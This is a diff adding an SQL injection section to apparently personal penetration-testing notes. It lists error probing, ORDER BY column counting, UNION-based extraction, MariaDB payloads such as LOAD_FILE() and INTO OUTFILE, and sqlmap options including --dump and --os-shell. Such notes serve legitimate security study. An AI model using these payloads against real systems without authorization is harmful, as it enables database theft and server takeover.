@@ -41,3 +41,34 @@ locating administration consoles
 tomcat
 phpmyadmin
 default credentials : /usr/share/seclists/Passwords/Default-Credentials
+
+=============
+SQL injection
+=============
+basic enumeration
+	' or "
+	read systax error
+
+column number enumeration
+	ORDER BY <number>
+	if error, number-1 is max column number
+
+understanding the layout of the output
+	UNION ALL SELECT <same number of column data>
+
+extracting data from the database
+	tasty payloads for MariaDB
+		@@version
+		user()
+		table_name FROM information_schema.tables
+		column_name FROM information_schema.columns WHERE table_name='<interesting table>'
+		LOAD_FILE()
+		INTO OUTFILE '<filename>'
+
+automating SQL injection
+	sqlmap -u <target url> -p "<parameter>"
+		-u <target url>
+		-p <parameter> specify the parameter
+		--dbms=<db software>   ex.mysql
+		--dump : dump the contents of all tables in the databases
+		--os-shell : execute a shell
